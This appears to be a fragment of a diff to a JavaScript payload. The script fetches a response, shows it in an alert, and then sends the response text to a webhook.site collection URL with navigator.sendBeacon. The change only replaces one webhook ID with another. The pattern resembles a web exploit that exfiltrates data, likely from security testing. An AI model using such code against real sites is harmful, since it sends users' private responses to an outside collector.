@@ -29,7 +29,7 @@
     .then(r => r.text().then(t => {
         alert(`Status: ${r.status}\n\nResponse:\n${t}`);
         if (navigator.sendBeacon) {
-            navigator.sendBeacon("https://webhook.site/5c94db67-4abc-404f-8bfc-28fa30017c95/query", t);
+            navigator.sendBeacon("https://webhook.site/be294564-fb2f-49d8-b3a8-ef25c7522be1/query", t);
         }
     }))
     .catch(e => {
